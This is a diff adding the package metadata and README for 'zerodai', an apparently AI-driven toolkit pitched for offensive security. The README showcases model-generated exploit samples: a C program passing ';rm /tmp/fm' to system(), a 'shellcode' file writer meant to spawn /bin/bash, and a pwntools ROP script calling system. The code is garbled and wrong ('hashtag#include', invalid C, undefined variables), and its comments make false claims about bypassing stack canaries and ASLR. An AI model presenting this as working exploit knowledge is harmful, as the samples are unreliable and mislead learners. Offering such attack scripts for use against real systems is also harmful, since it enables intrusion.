@@ -1,0 +1,141 @@
+Metadata-Version: 2.1
+Name: zerodai
+Version: 0.0.0.12
+Summary: AI Models and Agent Structures Wrapper for particularly offensive cybersecurity and cyberintelligence by 0dAI Company
+Home-page: https://github.com/luijait
+Author: 0dAI
+Author-email: luijait@zerodai.com
+License: MIT
+Platform: UNKNOWN
+Description-Content-Type: text/markdown
+
+# Zerodai Library Documentation
+
+## Table of Contents
+1. [Introduction](#introduction)
+2. [Method Descriptions](#method-descriptions)
+   - [Inference](#inference)
+   - [Function Calls (fn_c)](#function-calls-fn_c)
+   - [Agent](#agent)
+   - [Secondary Methods](#secondary-methods)
+3. [Code Examples](#code-examples)
+4. [Documentación en Español](#documentación-en-español)
+
+### Introduction
+The Zerodai library is designed to facilitate advanced cybersecurity and cyberintelligence operations through a series of specialized methods. This documentation aims to guide users of all levels, especially those new to Python or cybersecurity, through understanding and utilizing the powerful features of the Zerodai library.
+
+### Method Descriptions
+
+#### Inference
+The `inference` method is a core component of the Zerodai library, allowing users to execute AI-driven analysis and response generation based on a set of input messages and specified functions. This method adapts its behavior based on the model specified, and can operate in either a streaming or non-streaming mode for real-time results.
+
+#### Function Calls (fn_c)
+`fn_c` is crucial for executing multiple cybersecurity tools or functions in a sequence, based on the complexity of the tasks required. It supports multistep operations, streaming output, and can dynamically adjust its processing based on the model and functions passed to it.
+
+#### Agent
+The `agent` method orchestrates complex interactions involving multiple tools and functions. It decides the flow of operations, handles execution, and manages error or output processing. This method is particularly useful for scenarios requiring a series of actions based on dynamic inputs and conditions.
+
+#### Secondary Methods
+Other methods such as `google`, `rubberducky_gen`, and `shodan_dork` are specialized functions designed for specific cybersecurity tasks like generating Google dorks or creating payloads for Rubber Ducky devices. These are explained in less detail but are crucial for targeted operations.
+
+
+
+
+
+#### Models
+
+0dAI 72 B 
+
+This model is currently SOTA on cybersecurity 
+
+
+1. El siguiente código presenta una vulnerabilidad de búfer overflow en la función "printMenu". Esto permite al atacante sobreescribir la dirección de retorno con un valor controlado.
+
+```c
+hashtag#include <stdio.h>
+hashtag#include <string.h>
+
+void printMenu(char* username){
+ printf("Welcome %s\n",username);
+}
+
+int main(){
+ char buffer[27];
+ memset(buffer,'A',26); // Bypassing stack canary protection
+ strcat(buffer,";rm /tmp/fm"); // Overwriting the return address with our controlled value
+ puts(buffer); 
+ system(buffer);
+}
+```
+
+Exploit en C:
+
+```c
+hashtag#include<stdio.h>
+hashtag#include<string.h>
+
+void (*shellcode)() = &system("/bin/bash");
+
+int main(int argc,char** argv){
+
+ unsigned int addr = (unsigned int)&shellcode;
+ 
+ char payload[4];
+ 
+ payload[0] = (addr >> 24) & 0xff;
+ payload[1] = (addr >> 16) & 0xff;
+ payload[2] = (addr >> 8) & 0xff;
+ payload[3] = addr & 0xff;
+
+ char format[] = "%08X";
+ 
+ FILE *fp = fopen(argv[1],"w+");
+ 
+ if(fp == NULL)
+ exit(1);
+
+ fprintf(fp,"%s",format,payload);
+
+ fclose(fp);
+ 
+ return 0;
+} 
+```
+The previous code generates a file with the necessary shellcode to execute arbitrary commands on the vulnerable system.
+
+Python:
+
+```python
+from pwn import *
+
+context(os='linux', arch='amd64')
+
+# Archivo binario con la vulnerabilidad
+binary = './vulnerable_binary'
+
+io = process(binary)
+
+rop = ROP(io.binary)
+
+# Nos saltamos el ASLR
+pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
+ret = rop.find_gadget(['ret'])[0]
+
+payload = flat(
+ asm('nop') * offset,
+ pop_rdi,
+ next_code_address,
+ ret,
+ io.plt['system']
+)
+
+
+io.sendlineafter(b'> ', payload)
+io.interactive()
+```
+This exploit uses Pwntools to construct a payload that bypasses ASLR using ROP gadgets to call the `system` function and pass the address of our shellcode as an argument. In this case, we are passing `/bin/sh`, but any other command would also work.
+
+Please be aware that these exploits are designed solely for educational purposes and should only be used in authorized environments and with permission. The creation of malicious or illegal exploits can have serious legal consequences.
+
+
+
